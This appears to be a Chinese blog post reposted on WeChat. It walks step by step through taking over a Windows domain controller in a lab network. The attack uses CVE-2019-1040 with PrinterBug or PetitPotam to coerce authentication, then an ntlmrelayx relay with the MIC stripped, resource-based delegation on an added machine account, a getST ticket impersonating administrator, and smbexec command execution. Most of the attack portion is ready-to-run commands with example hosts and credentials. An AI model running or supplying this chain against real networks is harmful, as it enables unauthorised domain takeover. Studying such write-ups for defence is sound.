> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/u-AWAcqQHJQe0PZN58P4Vw)

**0x01 CVE-2019-1040**

该漏洞可以绕过NTLM中的`MIC`（消息完整性检查），修改已经过协商签名的身份验证流量。

在有辅助域的内网中，利用此漏洞，就能直接获取到域控的权限。

`Printerbug`配合资源约束委派打法
======================

`Printerbug`使得拥有控制域用户/计算机的攻击者可以指定域内的一台服务器，并使其对攻击者选择的目标进行身份验证，因此可以与CVE-2019-1040结合一起使用。
======================================================================================

当前环境信息：

```
192.168.4.11 DC1 主域空  
192.168.4.142 DC2 辅助域控  
192.168.4.141 WIN-BING-PC  
192.168.4.137 中继机器  
WIN-BING-PC机器流量代理到中继机器上
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM234D2vXuyAt26NsjibJP7fzbeWad9e7BUog1fCzISN90p8lAnRo1xJsC6K23ywJjkRd36h7OZfVyllA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

由于所有域用户向都可以在域中添加10个计算机帐户，因此在受控的`WIN-BING-PC`上，使用kk的用户身份新建一个机器用户hengGe

```
hyscan --scantype ldapscan --ldaptype addComputer --dc 192.168.4.11 --domainName hengge.com --pcname hengGe
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM234D2vXuyAt26NsjibJP7fzbeWDSk4ZDrxv0eNAVXXgU1ucsJRFuVOhRxibOPYFt7Kh9x5RqVk85icHNQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

执行ntlmrelayx.py脚本，`--delegate-access`选项是将中继计算机帐户的访问权限委托给攻击者，`--escalate-user`参数设置hengGe机器用户的资源委派，`--remove-mic`参数了是去除mic验证，如下所示

```
python ntlmrelayx.py -t ldap://192.168.4.11 -smb2support --remove-mic --delegate-access --escalate-user hengGe$ -debug
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
python printerbug.py hengge.com/kk:admin@444@192.168.4.142 192.168.4.137
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

`python getST.py -dc-ip 192.168.4.11 hengge.com/hengge$:123456 -spn cifs/DC2 -impersonate administrator`

`python smbexec.py -dc-ip 192.168.4.142 hengge.com/administrator@DC2 -k -no-pass -debug`

```
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
```

  

**0x02 PetitPotam配合资源约束委派打法**

`PetitPotam`使得拥有控制域用户/计算机的攻击者可以指定域内的一台服务器，并使其对攻击者选择的目标进行身份验证，因此可以与CVE-2019-1040结合一起使用。

当前环境信息：

```
192.168.4.11 DC1 主域空  
192.168.4.142 DC2 辅助域控  
192.168.4.141 WIN-BING-PC  
192.168.4.137 中继机器
```

`PetitPotam`和`PrinterBug`调用的接口不一样，但是都可以让域内的服务器发起身份验证，这里不详细学习了，这里还是一样演示利用过程

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以看到，直接匿名同样可以进行触发，这种仅局限于2008/2012的环境

```
python PetitPotam.py 192.168.4.137 192.168.4.142
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2016的环境就需要一个域用户来进行触发了

```
python PetitPotam.py -u kk -p admin@444 -d hengge.com 192.168.4.137 192.168.4.142
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

同样的通过s4u2self来进行相关的cifs的服务票据，然后通过smbexec来进行命令执行，我这里用windows来进行演示下

```
python getST.py -dc-ip 192.168.4.11 hengge.com/hengge$:123456 -spn cifs/DC2 -impersonate administrator  
set   
python smbexec.py -dc-ip 192.168.4.142 hengge.com/administrator@DC2 -k -no-pass -debug
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

来源：https://cnblogs.com/zpchcbd/p/15857942.html  

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/RUnwTiclM236hs7dJicTgNNFNibmibDql9S0fBjPSWkdOWiaGYlLAL8nlK2Xny95AYTew2u2rP9ibl27ibSVnQliaz7UibA/0?wx_fmt=png) ** 巡安似海 ** 巡安似海 — 致力于信息科技研究，不断更新免杀攻防，红蓝对抗，web安全，内网渗透，漏洞预警。 33篇原创内容   公众号

**往期推荐 ●●**

**// 1**

｜ [Windows Access Token提权详解](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247484567&idx=1&sn=6bffff72dfbd877fea70e0ccdf895f51&chksm=c1b3c374f6c44a62b008135e9312a54293222e7b1840005efa2bcdfc988de9bf0f0b44590f98&scene=21#wechat_redirect)

**// 2**

｜ [Linux反弹shell（一）文件描述符与重定向](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247484390&idx=1&sn=5eab5f8e6c61eaab43d04e355d8aeacb&chksm=c1b3c405f6c44d13e96b7cc0d29c77faf030a0c77d993d79aea19c5e82398ecc97747b5dac59&scene=21#wechat_redirect)  

**// 3**

｜ [对某快捷酒店一次内网测试](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247484268&idx=1&sn=80cd656289f0daa9fe26baeb164ef8fe&chksm=c1b3c48ff6c44d99f2b2a5a98bdf4b633fa836eca007265c867a650d9e8f516b94ed649e1c45&scene=21#wechat_redirect)  

**// 4**

｜ [Burp半自动时间盲注](http://mp.weixin.qq.com/s?__biz=MzkxODM2MDcxNg==&mid=2247483993&idx=1&sn=fd0c12fc9fab95f78efe95f1932ac927&chksm=c1b3c5baf6c44cac197116de76ccee67d9952369c8eefa73b499faaf2312eee8fe5cb25f7ba5&scene=21#wechat_redirect)